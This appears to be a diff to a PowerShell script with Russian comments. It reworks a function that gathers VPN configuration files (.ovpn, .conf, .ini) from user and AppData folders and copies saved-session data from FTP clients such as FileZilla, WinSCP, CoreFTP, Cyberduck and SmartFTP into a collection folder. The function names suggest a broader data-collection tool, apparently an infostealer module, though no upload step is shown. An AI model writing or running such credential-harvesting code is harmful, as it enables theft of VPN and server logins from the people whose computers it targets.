@@ -128,40 +128,56 @@ function Get-UserActivity { ... }
 function Get-VpnFtpData {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
+    $vpnDir = "$OutDirectory\VPN_Configs"
+    New-Item -Path $vpnDir -ItemType Directory -Force | Out-Null
 
-    $vpnConfigsDir = "$OutDirectory\VPN_Configs"
-    New-Item -Path $vpnConfigsDir -ItemType Directory -Force | Out-Null
-
-    # Быстро копируем файлы только из известных папок пользователя
-    $vpnFiles = @()
-    $userDirs = @("$env:USERPROFILE", "$env:APPDATA", "$env:LOCALAPPDATA")
-    foreach ($dir in $userDirs) {
-        foreach ($mask in @("*.ovpn", "*.conf", "*.ini")) {
-            $vpnFiles += Get-ChildItem -Path $dir -File -Recurse -Include $mask -ErrorAction SilentlyContinue
+    # Быстрый обход: только стандартные пользовательские папки
+    $searchDirs = @(
+        "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop",
+        "$env:APPDATA\OpenVPN", "$env:APPDATA\OpenVPN Connect", "$env:APPDATA\ProtonVPN"
+    )
+    foreach ($dir in $searchDirs) {
+        if (Test-Path $dir) {
+            Get-ChildItem -Path $dir -File -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue |
+                Where-Object { $_.Length -le 5MB } |
+                ForEach-Object {
+                    try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
+                    catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
+                }
         }
     }
-    $vpnFiles | Where-Object { $_.Length -le 5MB } | ForEach-Object {
-        try { Copy-Item $_.FullName -Destination $vpnConfigsDir -Force -ErrorAction Stop }
-        catch { Add-Content "$vpnConfigsDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
+
+    # Просто копируем готовые .ini/.conf в корневых директориях
+    $rootfiles = @(
+        "$env:USERPROFILE\*.ovpn", "$env:USERPROFILE\*.conf", "$env:USERPROFILE\*.ini"
+    )
+    foreach ($pattern in $rootfiles) {
+        Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue |
+            Where-Object { $_.Length -le 5MB } |
+            ForEach-Object {
+                try { Copy-Item $_.FullName -Destination $vpnDir -Force -ErrorAction Stop }
+                catch { Add-Content "$vpnDir\copy_errors.txt" "FAILED: $($_.FullName) : $($_.Exception.Message)" }
+            }
     }
 
-    # Параллельно копируем FTP клиентов
-    $ftpPaths = @("$env:APPDATA\FileZilla", "$env:APPDATA\WinSCP.ini", "$env:APPDATA\CoreFTP", "$env:APPDATA\Cyberduck", "$env:APPDATA\SmartFTP")
-    $destFTP = "$OutDirectory\FTP_Clients"
-    New-Item -Path $destFTP -ItemType Directory -Force | Out-Null
-
-    $ftpJobs = @()
+    # --- FTP Быстро! ---
+    $ftpDir = "$OutDirectory\FTP_Clients"
+    New-Item -Path $ftpDir -ItemType Directory -Force | Out-Null
+    $ftpPaths = @(
+        "$env:APPDATA\FileZilla",
+        "$env:APPDATA\WinSCP.ini",
+        "$env:APPDATA\CoreFTP",
+        "$env:APPDATA\Cyberduck",
+        "$env:APPDATA\SmartFTP"
+    )
     foreach ($ftpPath in $ftpPaths) {
         if (Test-Path $ftpPath) {
-            $ftpJobs += Start-Job -ScriptBlock {
-                param($path, $dest)
-                try { Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction Stop }
-                catch { Add-Content "$dest\copy_errors.txt" $_.Exception.Message }
-            } -ArgumentList $ftpPath, $destFTP
+            try { Copy-Item $ftpPath -Destination $ftpDir -Recurse -Force -ErrorAction Stop }
+            catch { Add-Content "$ftpDir\copy_errors.txt" $_.Exception.Message }
         }
     }
-    $ftpJobs | Wait-Job | Remove-Job
 }
+
 
 # --- ОПТИМИЗИРОВАННАЯ функция выполнения ---
 function Start-Execution {
